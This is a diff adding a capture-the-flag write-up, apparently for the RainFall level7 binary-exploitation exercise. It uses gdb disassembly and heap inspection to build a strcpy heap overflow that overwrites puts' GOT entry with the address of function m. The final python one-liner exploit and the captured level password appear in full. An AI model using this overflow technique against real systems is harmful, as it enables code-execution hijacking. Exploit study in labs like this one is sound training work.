@@ -1,0 +1,206 @@
+  GCC stack protector support:            Enabled
+  Strict user copy checks:                Disabled
+  Restrict /dev/mem access:               Enabled
+  Restrict /dev/kmem access:              Enabled
+  grsecurity / PaX: No GRKERNSEC
+  Kernel Heap Hardening: No KERNHEAP
+ System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
+
+level7@RainFall:~$ ls
+level7
+
+level7@RainFall:~$ gdb level7
+
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0804836c  _init
+0x080483b0  printf
+0x080483b0  printf@plt
+0x080483c0  fgets
+0x080483c0  fgets@plt
+0x080483d0  time
+0x080483d0  time@plt
+0x080483e0  strcpy
+0x080483e0  strcpy@plt
+0x080483f0  malloc
+0x080483f0  malloc@plt
+0x08048400  puts
+0x08048400  puts@plt
+0x08048410  __gmon_start__
+0x08048410  __gmon_start__@plt
+0x08048420  __libc_start_main
+0x08048420  __libc_start_main@plt
+0x08048430  fopen
+0x08048430  fopen@plt
+0x08048440  _start
+0x08048470  __do_global_dtors_aux
+0x080484d0  frame_dummy
+0x080484f4  m
+0x08048521  main
+0x08048610  __libc_csu_init
+0x08048680  __libc_csu_fini
+0x08048682  __i686.get_pc_thunk.bx
+0x08048690  __do_global_ctors_aux
+0x080486bc  _fini
+
+(gdb) disass main
+Dump of assembler code for function main:
+   0x08048521 <+0>:     push   %ebp
+   0x08048522 <+1>:     mov    %esp,%ebp
+   0x08048524 <+3>:     and    $0xfffffff0,%esp
+   0x08048527 <+6>:     sub    $0x20,%esp
+   0x0804852a <+9>:     movl   $0x8,(%esp)
+   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
+   0x08048536 <+21>:    mov    %eax,0x1c(%esp)
+   0x0804853a <+25>:    mov    0x1c(%esp),%eax
+   0x0804853e <+29>:    movl   $0x1,(%eax)
+   0x08048544 <+35>:    movl   $0x8,(%esp)
+   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
+   0x08048550 <+47>:    mov    %eax,%edx
+   0x08048552 <+49>:    mov    0x1c(%esp),%eax
+   0x08048556 <+53>:    mov    %edx,0x4(%eax)
+   0x08048559 <+56>:    movl   $0x8,(%esp)
+   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
+   0x08048565 <+68>:    mov    %eax,0x18(%esp)
+   0x08048569 <+72>:    mov    0x18(%esp),%eax
+   0x0804856d <+76>:    movl   $0x2,(%eax)
+   0x08048573 <+82>:    movl   $0x8,(%esp)
+   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
+   0x0804857f <+94>:    mov    %eax,%edx
+   0x08048581 <+96>:    mov    0x18(%esp),%eax
+   0x08048585 <+100>:   mov    %edx,0x4(%eax)
+   0x08048588 <+103>:   mov    0xc(%ebp),%eax
+   0x0804858b <+106>:   add    $0x4,%eax
+   0x0804858e <+109>:   mov    (%eax),%eax
+   0x08048590 <+111>:   mov    %eax,%edx
+   0x08048592 <+113>:   mov    0x1c(%esp),%eax
+   0x08048596 <+117>:   mov    0x4(%eax),%eax
+   0x08048599 <+120>:   mov    %edx,0x4(%esp)
+   0x0804859d <+124>:   mov    %eax,(%esp)
+   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
+   0x080485a5 <+132>:   mov    0xc(%ebp),%eax
+   0x080485a8 <+135>:   add    $0x8,%eax
+   0x080485ab <+138>:   mov    (%eax),%eax
+   0x080485ad <+140>:   mov    %eax,%edx
+   0x080485af <+142>:   mov    0x18(%esp),%eax
+   0x080485b3 <+146>:   mov    0x4(%eax),%eax
+   0x080485b6 <+149>:   mov    %edx,0x4(%esp)
+   0x080485ba <+153>:   mov    %eax,(%esp)
+   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
+   0x080485c2 <+161>:   mov    $0x80486e9,%edx
+   0x080485c7 <+166>:   mov    $0x80486eb,%eax
+   0x080485cc <+171>:   mov    %edx,0x4(%esp)
+   0x080485d0 <+175>:   mov    %eax,(%esp)
+   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
+   0x080485d8 <+183>:   mov    %eax,0x8(%esp)
+   0x080485dc <+187>:   movl   $0x44,0x4(%esp)
+   0x080485e4 <+195>:   movl   $0x8049960,(%esp)
+   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
+   0x080485f0 <+207>:   movl   $0x8048703,(%esp)
+   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
+   0x080485fc <+219>:   mov    $0x0,%eax
+   0x08048601 <+224>:   leave
+   0x08048602 <+225>:   ret
+End of assembler dump.
+
+(gdb) disass m
+Dump of assembler code for function m:
+   0x080484f4 <+0>:     push   %ebp
+   0x080484f5 <+1>:     mov    %esp,%ebp
+   0x080484f7 <+3>:     sub    $0x18,%esp
+   0x080484fa <+6>:     movl   $0x0,(%esp)
+   0x08048501 <+13>:    call   0x80483d0 <time@plt>
+   0x08048506 <+18>:    mov    $0x80486e0,%edx
+   0x0804850b <+23>:    mov    %eax,0x8(%esp)
+   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)
+   0x08048517 <+35>:    mov    %edx,(%esp)
+   0x0804851a <+38>:    call   0x80483b0 <printf@plt>
+   0x0804851f <+43>:    leave
+   0x08048520 <+44>:    ret
+End of assembler dump.
+
+(gdb) x /s 0x80486e9
+0x80486e9:       "r"
+
+(gdb) x /s 0x80486eb
+0x80486eb:       "/home/user/level8/.pass"
+
+(gdb) x /s 0x8049960
+0x8049960 <c>:   ""
+
+(gdb) x /s 0x8048703
+0x8048703:       "~~"
+
+(gdb) x /s 0x80486e0
+0x80486e0:       "%s - %d\n"
+
+(gdb) x /s 0x8049960
+0x8049960 <c>:   ""
+
+
+like in the prevois level we wanna swap the function "puts" with "m"
+
+
+(gdb) disass puts
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:     jmp    *0x8049928
+   0x08048406 <+6>:     push   $0x28
+   0x0804840b <+11>:    jmp    0x80483a0
+End of assembler dump.
+
+(gdb) disass 0x8049928
+Dump of assembler code for function puts@got.plt:
+   0x08049928 <+0>:     push   %es
+   0x08049929 <+1>:     test   %al,(%eax,%ecx,1)
+End of assembler dump.
+
+
+puts addr:	0x08049928 -> "\x28\x99\x04\x08"
+m addr:		0x080484f4 -> "\xf4\x84\x04\x08"
+
+
+with gdb we see that we need an offset of 20:
+
+(gdb) info proc mappings
+process 4169
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/user/level7/level7
+         0x8049000  0x804a000     0x1000        0x0 /home/user/level7/level7
+         0x804a000  0x806b000    0x21000        0x0 [heap]
+        0xb7e2b000 0xb7e2c000     0x1000        0x0
+        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd2000 0xb7fd5000     0x3000        0x0
+        0xb7fdb000 0xb7fdd000     0x2000        0x0
+        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+
+
+(gdb) x /40wx 0x804a000
+0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
+0x804a010:      0x00000000      0x00000011      0x00000000      0x00000000
+0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038
+0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
+0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
+0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a080:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a090:      0x00000000      0x00000000      0x00000000      0x00000000
+
+
+now we can successfully overwrite the puts address with m's
+
+> ./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1676905055
